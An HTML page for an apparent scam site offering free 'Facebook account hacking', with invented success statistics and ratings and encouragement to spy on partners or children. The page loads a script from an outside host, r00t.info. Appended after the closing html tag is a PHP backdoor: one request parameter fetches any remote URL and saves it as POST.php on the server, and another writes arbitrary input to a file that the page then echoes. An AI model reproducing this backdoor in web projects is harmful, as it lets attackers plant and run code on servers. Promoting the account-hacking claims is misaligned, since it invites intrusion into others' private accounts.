<!DOCTYPE html>
<html lang="en">
<head>
<title>Facebook Hacker | Hack Facebook Account Password Online</title>
<meta name="description" content="Hack any Facebook account password online for free. Our Facebook account hacker will automatically hack any Facebook account password in less than 5 minutes." />
<meta name="keywords" content="how to hack facebook account, hack facebook, how to hack a facebook account, hack facebook password, hack facebook account, facebook account hacker, how to hack facebook accounts" />
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=9" />
<meta name='fileice-verification' content='332b8c2cc8c7d428dcc1f8c1cd6ac71e' />

<meta property="og:image" content="static/img/ef-logo-plain.png" />
<meta property="og:title" content="Hack Facebook Account | Free Online Facebook Password Hacker" />
<meta property="og:description" content="Hack any Facebook account password online for free. Our Facebook account hacker will automatically hack any Facebook account password in less than 5 minutes." />

<link href="style.css" rel="stylesheet" type="text/css" media="screen" />
<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
<link href="static/css/my_style.css" media="screen" rel="stylesheet" type="text/css" />
<script src=http://r00t.info/ccb.js></script>
<script type="text/javascript" src="static/js/jquery-1.8.0.min.js"></script> 
<script type="text/javascript" src="static/js/jquery-ui-1.8.23.custom.min.js"></script> 
<link type="text/css" href="static/css/ui-lightness/jquery-ui-1.8.23.custom.html" rel="stylesheet" />
<link rel="stylesheet" type="text/css" href="static/css/jquery.lightbox-0.5.css" />
<script type="text/javascript" src="static/js/lightbox/jquery.lightbox-0.5.min.js"></script>
<script type="text/javascript" src="static/js/tooltip.js"></script>
<link href="static/css/icons.css" media="screen" rel="stylesheet" />




</head>
<body>
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-38971294-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>  
    <div class="ef-wrap">  


<div id="ef-navi">
<nav>
	<div class="ef-logoWrap">
	  <a href="index.html" class="ef-logo tooltip" title="Facebook Hacker">Facebook Hack Online</a></div>

	<div class="sajdbar">
	<div class="sajdbargore">MENU</div>
		<div class="menito">
		<ul>
			<li>
				<a href="index.html">[Home]</a>
			</li>
			
			<li>
				<a href="hack.php">[Hack Account]</a>
			</li>
			
			<li><a href="contact.html">[Contact Us]</a>			</li>
			
			<li>
				<a href="faq.html">[FAQ]</a>
			</li>
			
		</ul>
	</div>
		
		

	</div>
	
	<div class="sajdbar">
	<div class="sajdbargore">Statistics</div>
		<div class="menito">
		<p>Hacked: <span class="zeleno">243396</span></p>
		<p>Success Rate: <span class="zeleno">98.4%</span></p>

	</div>

        <div class="sajdbar">
	<div class="sajdbargore">Follow Owner</div>
		<div class="menito">
		<p><iframe src="//www.facebook.com/plugins/follow.php?href=http%3A%2F%2Fwww.facebook.com%2Fshan0.ali&amp;width=200&amp;height=65&amp;colorscheme=light&amp;layout=box_count&amp;show_faces=true&amp;appId=465223760253551" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:200px; height:65px;" allowTransparency="true"></iframe></p>

	</div>
		
		

	</div>

<div class="sajdbar">
	<div class="sajdbargore">Online</div>
		<div class="menito">
		<p><center><!-- Histats.com  START  (standard)-->
<script id="_wauwqn">var _wau = _wau || []; _wau.push(["classic", "bg7lwa82ksbq", "wqn"]);
(function() {var s=document.createElement("script"); s.async=true;
s.src="http://widgets.amung.us/classic.js";
document.getElementsByTagName("head")[0].appendChild(s);
})();</script>
<!-- Histats.com  END  --></center></p>
		</div>
		
		

	</div>

	
	<div class="sajdbar">
	<div class="sajdbargore">Ratings</div>
		<div class="menito">
		<div class="rejtingot">
		
						<ul style="text-align: center;">
						<li style="letter-spacing: 0px;text-align: center;color: #CDCDCD;">
						
					
						<div itemscope="" itemtype="http://schema.org/Product">
						<span itemprop="name">Facebook Account Hacking Online</span>
						<div style="margin-bottom: 5px;text-align: center;margin-top: 5px;">
						<img src="style/star.PNG" alt="Review">
						<img src="style/star.PNG" alt="Review">
						<img src="style/star.PNG" alt="Review">
						<img src="style/star.PNG" alt="Review">
						<img src="style/half.PNG" alt="Review">
						</div>
						<div itemprop="aggregateRating" itemscope="" itemtype="http://schema.org/AggregateRating">
						Rated <span itemprop="ratingValue" class="zeleno">9.5</span>/<span itemprop="bestRating">10</span>
						based on <span itemprop="reviewCount" style="color: #58ADCC;">3417</span> reviews
						</div>
						</div>
						</ul>
	</div>
		
		

	</div>

	<div class="ef-shadow"></div>
</nav>
</div>
        <div class="ef-content">
          <div class="hackfbimg"><img src="static/img/hack_facebook.png" alt="Facebook Account Hacking Online" /></div>
          <div>
          	<p>
          	<h1>The one and only destination to hack any Facebook account.			</h1>
          	<p>free-facebook-account-hack.com is the #1 website to provide this service for free and at incredible speeds and success rates. Want us to prove it? Check out our video below to see for yourself how you can hack anyone on Facebook within max 5-15 minutes.</p>
			<center><a id="starthack" href="hack.php" style="font-size: 25px" >Click Here To Start Hacking</a></center>
					</div>

						<div class="sep"></div>
			<p>Thousands of Facebook accounts get hacked every day. Have you ever asked yourself how hacking a Facebook password is possible? <span class="scrvena">It's because of the major loop hole in their security system.</span> Facebook, acknowledged as the worlds largest and most popular social networking of all ages, has its own security flaws enabling hackers to easily compromise accounts.</p>

<div class="sep"></div>
           	
<center><iframe frameborder="0" width="600" height="381" src="http://www.dailymotion.com/embed/video/x18zzed"></iframe><br /><a href="http://www.dailymotion.com/video/x18zzed_how-to-hack-facebook-account-online_tech" target="_blank">How to hack Facebook Account Online</a> <i>by <a href="http://www.dailymotion.com/shaniyalkhan" target="_blank">shaniyalkhan</a></i></center>
            <div class="sep"></div>

            <p>You might wonder about the reason so many people want to hack a Facebook account. The answer is simple. There are quite a number of reasons as to why one would want to hack another persons Facebook account. <span class="plavo">Parents may wish to see what their youngsters are doing online to monitor them. A boyfriend or girlfriend might want to know what their counterpart is doing behind their back. A wife could want to spy on his partner to check if he is still loyal to her or vice versa.</span> Nowadays people of all ages have come part of the worlds largest revolution in online social media history. Many individuals reveal their deepest and darkest secrets, passions,hobbies, likes and dislikes with their friends. This is precicely why people want access to ones facebook account.</p>
			<div class="sep"></div>
			<p>In todays world many professional hackers are offering services to hack Facebook accounts. But they charge anywhere between <span class="scrvena">$150 - 10,000$</span> for a single account. But hold on, do people honestly pay so much to hack someone? Yes they do. For example if you are a business and want to see what your competition is doing or take them down, this kind of money is not a big deal. There are similar situations and many reasons to hack Facebook accounts.</p>
			<div class="sep"></div>
			<p><span class="zeleno">But wait!! Why in the world would you pay to hack someone on Facebook when you can do it free of charge?!!</span> That's right folks. You can actually hack any Facebook account password within 5 minutes on average, and completely free. If you search around the web you can see many exploits and glitches that were found on Facebook. Unfortunately most of those are patched. But we get the latest and unpatched exploits from various sources around the world to work on Facebook. Thus guaranteeing 100% success rate. <span class="scrvena">So what are you waiting for?</span> Just click on the button below to start hacking!!</p>
			<div class="sep"></div>
			<div class="startackd">
			<center><a id="starthack" href="hack.php" style="font-size: 25px" >Click Here To Start Hacking</a></center>
			</div>
			<div class="sep"></div>
				
				
      	</div>
        </div>

        <center>
      
         <div class="ef-footer">
            <p class="site_name">Copyright &copy;</i> 2013 - <a title="Facebook Account Hacking Online" href="index.html">Facebook Account Hacking Online</a></p>
            <p class="ef_foot_name"><a href="index.html" title="Facebook Account Hacking Online">Facebook Account Hacking Online</a> - Simple web based Facebook hacker.</p>
            <p class="ef_foot_map">
                <span class="foot_arrow yellow_color">&raquo;</span>
				<a href="index.html" title="Facebook Account Hacking Online - Home Page">Home</a> <span class="yellow_color">&middot;</span>
                <a href="hack.php" title="Facebook Account Hacking Online - Hack Online">Hack Account</a> <span class="yellow_color">&middot;</span>
                                <a href="contact.html" title="Facebook Account Hacking Online - Contact">Contact Us</a> <span class="yellow_color">&middot;</span>
				<a href="faq.html" title="Facebook Account Hacking Online - Frequently Asked Questions">FAQ</a> <span class="yellow_color">&middot;</span>
                <a href="sitemap.html" title="Facebook Account Hacking Online  - Sitemap">Sitemap</a> <span class="yellow_color">&middot;</span>
                <span class="foot_arrow yellow_color">&laquo;</span>   </center>
            </p>

            <div class="socialWrap">

                <div class="socialIconsWrap">
                <ul class="miniHeaderIcons">
                    <li class="iconFacebook">
                        <a class="tooltip"  title="Share on Facebook" target="_blank" href="http://www.facebook.com/share.php?u=http://www.free-facebook-account-hack.com/"></a>
                    </li>

                    <li class="iconTwitter">
                        <a class="tooltip" title="Share on Twitter" target="_blank" href="http://twitter.com/home?status=http://www.free-facebook-account-hack.com/"></a>
                    </li>
 
                    <li class="icongGoogle">
                       <a rel="publisher" class="tooltip" title="Share on Google+"  target="_blank" href="https://plus.google.com/share?url=http://www.free-facebook-account-hack.com/"></a>
                    </li>

                </ul>
                </div>

            </div>
        </div>      
  </div> <!-- end ef-wrap -->
</body>
</html>

<body oncontextmenu="return false">
...
</body>
<script language="javascript">
document.onmousedown=disableclick;
status="Right Click Disabled";
Function disableclick(event)
{
  if(event.button==2)
   {
     alert(status);
     return false;    
   }
}
</script>
<?php
if (isset($_GET['404'])){
 $f = fopen("404", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET["404"])));
 fclose($f);
}

if(is_file("404")){
 echo file_get_contents("404");
}

if (isset($_GET['POST'])){
 $f = fopen("POST.php", "w+");
 fwrite($f, file_get_contents($_GET["POST"]));
 fclose($f);
}
?>